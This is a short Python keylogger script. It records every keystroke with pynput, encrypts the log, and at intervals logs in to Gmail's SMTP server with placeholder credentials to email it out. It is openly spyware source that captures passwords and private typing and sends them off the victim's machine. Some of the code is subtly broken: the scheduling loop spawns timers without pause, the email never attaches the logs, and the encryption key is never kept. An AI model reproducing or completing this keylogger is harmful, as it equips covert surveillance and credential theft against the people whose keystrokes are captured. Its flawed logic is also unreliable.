from pynput import keyboard
from cryptography.fernet import Fernet
import smtplib
import os
import threading


ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)

# Log file
log_file = "keylog.txt"
encrypted_file = "keylog.enc"

# Email credentials 
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_password"


def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" {key} ")


def encrypt_logs():
    with open(log_file, "rb") as f:
        encrypted_data = cipher.encrypt(f.read())
    with open(encrypted_file, "wb") as f:
        f.write(encrypted_data)
    os.remove(log_file)

# Send email with encrypted logs
def send_email():
    encrypt_logs()
    with open(encrypted_file, "rb") as f:
        encrypted_content = f.read()
    
    message = f"Subject: Keylogger Logs\n\nAttached are the encrypted logs."
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, message)
    server.quit()
    os.remove(encrypted_file)

def start_logging():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def schedule_email():
    while True:
        threading.Timer(1800, send_email).start()


threading.Thread(target=start_logging).start()
threading.Thread(target=schedule_email).start()
